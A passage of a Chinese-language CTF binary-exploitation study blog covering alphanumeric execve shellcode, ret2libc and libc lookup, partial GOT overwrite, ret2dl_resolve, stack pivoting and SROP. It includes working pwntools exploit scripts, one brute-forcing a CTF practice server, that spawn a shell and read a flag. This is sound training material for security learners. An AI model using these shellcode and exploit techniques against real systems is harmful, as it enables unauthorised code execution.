class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// ref: https://hama.hatenadiary.jp/entry/2017/04/04/190129</span></span><br><span class=\"line\"><span class=\"comment\">/* from call rax */</span></span><br><span class=\"line\">push rax</span><br><span class=\"line\">push rax</span><br><span class=\"line\">pop rcx</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* XOR pop rsi, pop rdi, syscall */</span></span><br><span class=\"line\">push <span class=\"number\">0x41413030</span></span><br><span class=\"line\">pop rax</span><br><span class=\"line\">xor DWORD PTR [rcx+<span class=\"number\">0x30</span>], eax</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* XOR /bin/sh */</span></span><br><span class=\"line\">push <span class=\"number\">0x34303041</span></span><br><span class=\"line\">pop rax</span><br><span class=\"line\">xor DWORD PTR [rcx+<span class=\"number\">0x34</span>], eax</span><br><span class=\"line\">push <span class=\"number\">0x41303041</span></span><br><span class=\"line\">pop rax</span><br><span class=\"line\">xor DWORD PTR [rcx+<span class=\"number\">0x38</span>], eax</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* rdi = &amp;&#x27;/bin/sh&#x27; */</span></span><br><span class=\"line\">push rcx</span><br><span class=\"line\">pop rax</span><br><span class=\"line\">xor al, <span class=\"number\">0x34</span></span><br><span class=\"line\">push rax</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* rdx = 0 */</span></span><br><span class=\"line\">push <span class=\"number\">0x30</span></span><br><span class=\"line\">pop rax</span><br><span class=\"line\">xor al, <span class=\"number\">0x30</span></span><br><span class=\"line\">push rax</span><br><span class=\"line\">pop rdx</span><br><span class=\"line\"></span><br><span class=\"line\">push rax</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* rax = 59 (SYS_execve) */</span></span><br><span class=\"line\">push <span class=\"number\">0x41</span></span><br><span class=\"line\">pop rax</span><br><span class=\"line\">xor al, <span class=\"number\">0x7a</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* pop rsi, pop rdi*/</span></span><br><span class=\"line\"><span class=\"comment\">/* syscall */</span> </span><br><span class=\"line\">.byte <span class=\"number\">0x6e</span></span><br><span class=\"line\">.byte <span class=\"number\">0x6f</span></span><br><span class=\"line\">.byte <span class=\"number\">0x4e</span></span><br><span class=\"line\">.byte <span class=\"number\">0x44</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* /bin/sh */</span></span><br><span class=\"line\">.byte <span class=\"number\">0x6e</span></span><br><span class=\"line\">.byte <span class=\"number\">0x52</span></span><br><span class=\"line\">.byte <span class=\"number\">0x59</span></span><br><span class=\"line\">.byte <span class=\"number\">0x5a</span></span><br><span class=\"line\">.byte <span class=\"number\">0x6e</span></span><br><span class=\"line\">.byte <span class=\"number\">0x43</span></span><br><span class=\"line\">.byte <span class=\"number\">0x5a</span></span><br><span class=\"line\">.byte <span class=\"number\">0x41</span></span><br></pre></td></tr></table></figure>\n<p>构造尽可能短的shellcode可能用到的一些指令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cdp  </span><br><span class=\"line\">%The CDQ instruction copies the sign (bit 31) </span><br><span class=\"line\">%of the value in the EAX register into every bit </span><br><span class=\"line\">%position in the EDX register. </span><br></pre></td></tr></table></figure>\n<h4 id=\"shellcode生成工具\">shellcode生成工具</h4>\n<p>同时，现在有多种针对shellcode进行编码的生成工具，生成符合限制的shellcode，如msf，alpha3等等，由于我没有用过，可以自行尝试。</p>\n<h4 id=\"mprotect\">mprotect()</h4>\n<p>进一步的，很多题目没有天然的readable  and  executable segment，题目可能通过mmap()映射了一段权限为7的段，或者存在mprotect()函数。</p>\n<p>这个函数可以修改指定内存段的权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mprotect:</span><br><span class=\"line\">int mprotect(void *addr, size_t len, int prot);</span><br><span class=\"line\">addr 内存起始地址</span><br><span class=\"line\">len  修改内存的长度</span><br><span class=\"line\">prot 内存的权限，7为可读可写可执行</span><br></pre></td></tr></table></figure>\n<p>如果存在这样的函数，可以考虑将其加入ROP链，从而进一步调用shellcode</p>\n<h3 id=\"ret2libc\">ret2libc</h3>\n<h4 id=\"leak-libc\">leak_libc</h4>\n<p>对于最后调用 libc 中 system 的题目而言，需要考虑的首要问题就是leak_libc.</p>\n<p>目前而言，我遇到的栈题中leak_libc，有两种方法：</p>\n<ol>\n<li>partial_overwrite<br>\n有时候，在栈中会存留libc中地址，在后面存在直接输出的函数的情况下，可以带出此地址。</li>\n<li>通过puts，write等函数，打印<code>.got</code>，获取对应函数的地址，这里，在没有给定对应libc版本的情况下，也可以通过LibcSearcher查找对应libc版本</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ref:  https://github.com/lieanu/LibcSearcher</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span></span><br><span class=\"line\">obj = LibcSearcher(<span class=\"string\">&quot;fgets&quot;</span>, <span class=\"number\">0X7ff39014bd90</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">obj.dump(<span class=\"string\">&quot;system&quot;</span>)        <span class=\"comment\">#system 偏移</span></span><br><span class=\"line\">obj.dump(<span class=\"string\">&quot;str_bin_sh&quot;</span>)    <span class=\"comment\">#/bin/sh 偏移</span></span><br><span class=\"line\">obj.dump(<span class=\"string\">&quot;__libc_start_main_ret&quot;</span>)    </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>另一个可以本地部署的实用工具是libc-database</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ./find <span class=\"built_in\">printf</span> 260 puts f30</span><br><span class=\"line\">archive-glibc (libc6_2.19-10ubuntu2_i386)</span><br><span class=\"line\">$ ./dump libc6_2.19-0ubuntu6.6_i386</span><br><span class=\"line\">offset___libc_start_main_ret = 0x19a83</span><br><span class=\"line\">offset_system = 0x00040190</span><br><span class=\"line\">offset_dup2 = 0x000db590</span><br><span class=\"line\">offset_recv = 0x000ed2d0</span><br><span class=\"line\">offset_str_bin_sh = 0x160a24</span><br><span class=\"line\">$ ./identify bid=ebeabf5f7039f53748e996fc976b4da2d486a626</span><br><span class=\"line\">libc6_2.17-93ubuntu4_i386</span><br><span class=\"line\">$ ./identify md5=af7c40da33c685d67cdb166bd6ab7ac0</span><br><span class=\"line\">libc6_2.17-93ubuntu4_i386</span><br><span class=\"line\">$ ./identify sha1=9054f5cb7969056b6816b1e2572f2506370940c4</span><br><span class=\"line\">libc6_2.17-93ubuntu4_i386</span><br><span class=\"line\">$ ./identify sha256=8dc102c06c50512d1e5142ce93a6faf4ec8b6f5d9e33d2e1b45311aef683d9b2</span><br><span class=\"line\">libc6_2.17-93ubuntu4_i386</span><br></pre></td></tr></table></figure>\n<h4 id=\"partial-overwrite\">partial_overwrite</h4>\n<h5 id=\"前置知识\">前置知识</h5>\n<p>针对没有泄露的赛题，可以考虑partial_overwrite改写<code>got</code>表，实现system，因为一般而言，大部分libc函数，里面都存在syscall，所以syscall偏移和函数head_addr差别不会太大。</p>\n<p>考虑对于一个<code>got</code>表中的64位地址:  0xXXXXXXXXXXXXX， 假设其附近的syscall地址后三位偏移为0xaaa(请确定这个偏移和got内函数偏移只有最后四个16位数字不同)， 因为libc装载地址以页为单位，后三位是确定0x000，那么partial_overwrite覆盖后面两个字节， 即覆盖<code>got</code>为0xXXXXXXXXfaaa，那么有1/16的几率恰好syscall</p>\n<h5 id=\"爆破脚本写法\">爆破脚本写法</h5>\n<p>一个爆破脚本模板:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\">elf =<span class=\"string\">&#x27;./ciscn_s_3&#x27;</span></span><br><span class=\"line\">remote_add = <span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class=\"line\">remote_port = <span class=\"number\">29554</span></span><br><span class=\"line\"></span><br><span class=\"line\">main_add = <span class=\"number\">0x40051d</span></span><br><span class=\"line\">off = <span class=\"number\">0x130</span></span><br><span class=\"line\">system_add = <span class=\"number\">0x400517</span></span><br><span class=\"line\">rtframe = <span class=\"number\">0x4004da</span></span><br><span class=\"line\">ret_add = <span class=\"number\">0x4004e9</span></span><br><span class=\"line\"></span><br><span class=\"line\">i = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> i &lt; <span class=\"number\">20</span>:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">        context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> sys.argv[<span class=\"number\">1</span>] == <span class=\"string\">&#x27;r&#x27;</span>:</span><br><span class=\"line\">            p = remote(remote_add, remote_port, timeout = <span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> sys.argv[<span class=\"number\">1</span>] == <span class=\"string\">&#x27;d&#x27;</span>:</span><br><span class=\"line\">            p = gdb.debug(elf)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            p = process(elf, timeout = <span class=\"number\">1</span>)</span><br><span class=\"line\">        payload1 = <span class=\"string\">b&#x27;/bin/sh\\0&#x27;</span> + cyclic(<span class=\"number\">0x8</span>)</span><br><span class=\"line\">        payload1+= p64(main_add)</span><br><span class=\"line\"></span><br><span class=\"line\">        p.sendline(payload1)</span><br><span class=\"line\"></span><br><span class=\"line\">        stack_add = u64(p.recv(<span class=\"number\">0x28</span>)[-<span class=\"number\">8</span>::]) - off</span><br><span class=\"line\"></span><br><span class=\"line\">        frame = SigreturnFrame()</span><br><span class=\"line\">        frame.rax = <span class=\"number\">0x3b</span></span><br><span class=\"line\">        frame.rdi = stack_add</span><br><span class=\"line\">        frame.rsi = <span class=\"number\">0</span></span><br><span class=\"line\">        frame.rdx = <span class=\"number\">0</span></span><br><span class=\"line\">        frame.rsp = stack_add</span><br><span class=\"line\">        frame.rip = system_add</span><br><span class=\"line\"></span><br><span class=\"line\">        payload = <span class=\"string\">b&#x27;/bin/sh\\0&#x27;</span> + cyclic(<span class=\"number\">0x8</span>)</span><br><span class=\"line\">        payload+= p64(rtframe)</span><br><span class=\"line\">        payload+= p64(system_add)</span><br><span class=\"line\">        payload+= <span class=\"built_in\">bytes</span>(frame)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#p.sendline(&#x27;a&#x27;)</span></span><br><span class=\"line\">        <span class=\"comment\">#p.recvuntil(&#x27;\\0&#x27;)</span></span><br><span class=\"line\">        p.sendline(payload)</span><br><span class=\"line\">        p.recvuntil(<span class=\"string\">&#x27;/bin/sh&#x27;</span>)</span><br><span class=\"line\">        p.sendline(<span class=\"string\">&#x27;cat flag&#x27;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(p.recvline())</span><br><span class=\"line\">        </span><br><span class=\"line\">        p.close()</span><br><span class=\"line\">    <span class=\"keyword\">except</span> BaseException <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        p.close()</span><br><span class=\"line\"></span><br><span class=\"line\">    off+=<span class=\"number\">0x8</span></span><br><span class=\"line\">    i+=<span class=\"number\">1</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>核心模板:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> True:</span><br><span class=\"line\">    try:</span><br><span class=\"line\">\t\t<span class=\"comment\">// p = process()</span></span><br><span class=\"line\">\t\t<span class=\"comment\">// pass</span></span><br><span class=\"line\">        p.sendline(<span class=\"string\">&#x27;cat flag&#x27;</span>)</span><br><span class=\"line\">        print(p.recvline())</span><br><span class=\"line\">        p.close()</span><br><span class=\"line\">    except BaseException as e:</span><br><span class=\"line\">        p.close()</span><br><span class=\"line\">    <span class=\"comment\">// pass</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>采用grep 获取输出包含flag的行就行</p>\n<h4 id=\"ret2dl-resolve\">ret2dl_resolve()</h4>\n<p>延迟绑定会使用_dl_resolve()函数</p>\n<ul>\n<li>\n<p>_dl_resolve中</p>\n<p>_dl_resolve调用_dl_fixup, _dl_dixup流程：</p>\n<ol>\n<li>通过link_map 获得.dynsym、.dynstr、.rel.plt地址</li>\n<li>通过reloc_offset + ret.plt地址获得函数对应的Elf64_Rel指针</li>\n<li>通过&amp;(ELF64_Rel)-&gt;r_info 和.dynsym取得对应Elf64_Sym指针</li>\n<li>检查r_info</li>\n<li>检查&amp;(Elf64_Sym)-&gt;st_other</li>\n<li>通过strtab(DT_STRTAB中的地址)+st_name(.dymsym中的偏移)获得函数对应的字符串，进行查找，找到后赋值给rel_addr,最后调用这个函数</li>\n</ol>\n</li>\n</ul>\n<p>综合而言，有如下利用方法(参考CTF-wiki，主要是第三种，因为存在信息泄露时，可用其他方法)</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"></th>\n<th style=\"text-align:left\">修改 dynamic 节的内容</th>\n<th style=\"text-align:left\">修改重定位表项的位置</th>\n<th style=\"text-align:left\">伪造 linkmap</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">主要前提要求</td>\n<td style=\"text-align:left\">无</td>\n<td style=\"text-align:left\">无</td>\n<td style=\"text-align:left\">无信息泄漏时需要 libc</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">适用情况</td>\n<td style=\"text-align:left\">NO RELRO</td>\n<td style=\"text-align:left\">NO RELRO, Partial RELRO</td>\n<td style=\"text-align:left\">NO RELRO, Partial RELRO</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">注意点</td>\n<td style=\"text-align:left\"></td>\n<td style=\"text-align:left\">确保版本检查通过；确保重定位位置可写；确保重定位表项、符号表、字符串表一一对应</td>\n<td style=\"text-align:left\">确保重定位位置可写；需要着重伪造重定位表项、符号表；</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"Tricks\">Tricks</h3>\n<h4 id=\"stack-pivoting\">stack pivoting</h4>\n<p>栈迁移技巧， 主要针对可溢出字节较少的情况，通过<code>leave</code>此类指令控制rsp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">;leave 相当于:</span><br><span class=\"line\">mov rsp,rbp</span><br><span class=\"line\">pop rbp</span><br><span class=\"line\">;那么考虑将栈帧中rbp地址改为栈迁移目的地址</span><br><span class=\"line\">;leave两次之后，就可以将栈转移到目的地址</span><br><span class=\"line\">;同时要现在目的地址布置好fake_stack</span><br></pre></td></tr></table></figure>\n<p>可以知道，栈迁移的前提在于，需要提前布置好栈帧，即在.bss ，  或者.data等段写入，一般要求前面有读取到.data段的函数</p>\n<p>不过，现在栈迁移一般会稍微复杂一些，读取类函数(如read)和leave可能在一个栈帧，这就要求我们在劫持read写入到指定地址的同时，实现分段栈迁移，大致流程如下:</p>\n<ul>\n<li>在第一次read读入后将rbp改为要写入的位置</li>\n<li>ret到read</li>\n<li>第二次read读入的数据将rbp改为写入的ROP链的位置，注意leave后的指令位置会加8</li>\n<li>这个leave的加8会把我们的rip指向我们第二次写入时的ret位置，只要我们第二次写入的ret位置指向leave，就实现了第二次的栈迁移，迁移到了第二次写入的ROP链的位置</li>\n</ul>\n<h5 id=\"example\">example</h5>\n<p>一个程序反汇编后:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s[<span class=\"number\">48</span>]; <span class=\"comment\">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  init(argc, argv, envp);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;You can use stackoverflow.&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;But only overflow a bit more...&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;And you must print first.&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(s, <span class=\"number\">0</span>, <span class=\"number\">0x20</span>uLL);</span><br><span class=\"line\">  write(<span class=\"number\">1</span>, s, <span class=\"number\">0x30</span>uLL);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, s, <span class=\"number\">0x40</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这个题目本身比较简单，本身给了你一个泄露，又只开了PIE，通过这个write的泄露可以拿到libc地址，考虑到题目还给了libc，预期解可能是找libc里面的/bin/sh字符串</p>\n<p>但是既然没有开PIE，就没有必要这么麻烦了，直接在数据段写入/bin/sh就行</p>\n<p><s>虽然大致脚本很早就写完了，但是运行发现了一些令人无语的错误</s></p>\n<p><strong>exp</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./ezrop&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = gdb.debug(&#x27;./ezrop&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">m = u64(p.recv(<span class=\"number\">40</span>)[-<span class=\"number\">8</span>:])</span><br><span class=\"line\"></span><br><span class=\"line\">payloads = p64(<span class=\"number\">0x400863</span>) + <span class=\"string\">b&#x27;/bin/sh\\0&#x27;</span> + p64(<span class=\"number\">0x400600</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payloads += cyclic(<span class=\"number\">0x18</span>)</span><br><span class=\"line\">payloads += p64(<span class=\"number\">0x601848</span>+<span class=\"number\">0x30</span>) + p64(<span class=\"number\">0x4007d9</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payloads)</span><br><span class=\"line\"></span><br><span class=\"line\">sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payloads = p64(<span class=\"number\">0x4006fa</span>) + p64(<span class=\"number\">0x400863</span>) + p64(<span class=\"number\">0x601868</span>) + p64(<span class=\"number\">0x400600</span>) </span><br><span class=\"line\">payloads += <span class=\"string\">b&#x27;/bin/sh\\0&#x27;</span></span><br><span class=\"line\">payloads += <span class=\"string\">b&#x27;/bin/sh\\0&#x27;</span></span><br><span class=\"line\">payloads += p64(<span class=\"number\">0x601848</span>-<span class=\"number\">0x8</span>) + p64(<span class=\"number\">0x4007f9</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payloads)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#0x00007f7b3ce92bb0      0x00007f7b3ccf8450</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"栈对齐\">栈对齐</h4>\n<p>栈对齐是高版本Ubuntu的一个特性，网上对于这个特性的解释很多都是错误的，还把它与栈平衡搞混了。</p>\n<p>这个特性来源于新版本xmm相关指令需要内存对齐，当程序运行到这些指令时，如果内存不是16位对齐，就会直接coredump</p>\n<p>可以:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ gdb -c core</span><br></pre></td></tr></table></figure>\n<p>调试core文件</p>\n<p>如果终止指令类似于:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">► <span class=\"number\">0x7fa8677a3396</span>    movaps xmmword ptr [rsp + <span class=\"number\">0x40</span>], xmm0</span><br></pre></td></tr></table></figure>\n<p>说明是栈对齐的原因，小心调整栈帧就行</p>\n<h4 id=\"Stack-smash\">Stack smash</h4>\n<p>对于某些将flag装载到内存，并且知道flag的地址、开启了cannary的题目而言，可以考虑stack_smash。</p>\n<p>在开启cannary 防护的题目中，检测到栈溢出后，会调用 <code>__stack_chk_fail</code> 函数来打印 argv[0] 指针所指向的字符串，而这个地址可以被覆盖，因此，可以利用此实现泄露flag</p>\n<h4 id=\"SROP\">SROP</h4>\n<h5 id=\"前置知识-2\">前置知识:</h5>\n<p>在进程接收到signal时，内核会将其上下文保存位sigFrame，然后进入signal_handle，对信号处理，返回后，会执行sigreturn调用，恢复保存Frame，主要包括寄存器和控制流(rip，rsp)的一些设置。</p>\n<p>那么，当我们伪造一个Frame，并且触发sigreturn调用时，就能控制寄存器和控制流，这也就是SROP的本质。</p>\n<p>同一般rop链相比，可以自由控制rax，进一步的，可以自由控制系统调用，所以SROP拓展了ROP的attack methods。</p>\n<p>SROP简要流程:</p>\n<ol>\n<li>构造fake_frame</li>\n<li>控制当前rsp指向fake_frame底部</li>\n<li>sigreturn调用</li>\n</ol>\n<p>sigFrame结构如下:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// x64</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">fpstate</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"comment\">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class=\"line\">  <span class=\"type\">__uint16_t</span>        cwd;</span><br><span 